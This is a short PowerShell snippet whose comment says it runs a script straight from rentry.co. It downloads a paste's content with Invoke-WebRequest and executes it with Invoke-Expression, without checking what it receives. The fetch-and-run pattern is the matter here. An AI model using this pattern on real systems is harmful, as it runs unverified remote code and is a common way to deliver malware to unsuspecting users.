#this script will run a script directly from rentry.co
$url = "https://rentry.co/<HASH>"
$script = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
Invoke-Expression $script